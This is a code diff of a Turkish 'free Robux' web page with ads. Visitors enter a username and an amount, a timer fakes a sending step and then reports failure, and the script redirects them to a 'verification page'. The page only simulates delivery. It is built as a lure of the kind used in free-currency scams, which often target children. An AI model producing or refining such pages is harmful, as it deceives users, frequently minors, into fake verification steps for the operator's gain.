@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <title>ÜCRETSİZ ROBUX 💎</title>
 <link rel="icon" href="logo.png" type="image/png">
+
 <!-- Google AdSense -->
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9272463357075503"
 crossorigin="anonymous"></script>
@@ -51,16 +52,13 @@ button{
 <input type="number" id="miktar" placeholder="Miktar (Max 500)" max="500">
 
 <br>
-
 <button onclick="gonder()">Gönder</button>
 
 <div id="mesaj"></div>
-
 </div>
 
 <script>
 function gonder(){
-
     let ad = document.getElementById("ad").value;
     let miktar = document.getElementById("miktar").value;
 
@@ -72,8 +70,9 @@ function gonder(){
     document.getElementById("mesaj").innerHTML="Gönderiliyor...";
 
     setTimeout(function(){
-        document.getElementById("mesaj").innerHTML="Gönderim Başarısız ❌ Doğrulama Adımlarını Tamamlayın.";
+        document.getElementById("mesaj").innerHTML="Gönderim Başarısız ❌ Lütfen adımları takip edin.";
         setTimeout(function(){
+            // Statik sayfaya yönlendirme
             window.location.href = "l-dogrulamasayfasi.html";
         }, 3000);
     },5000);
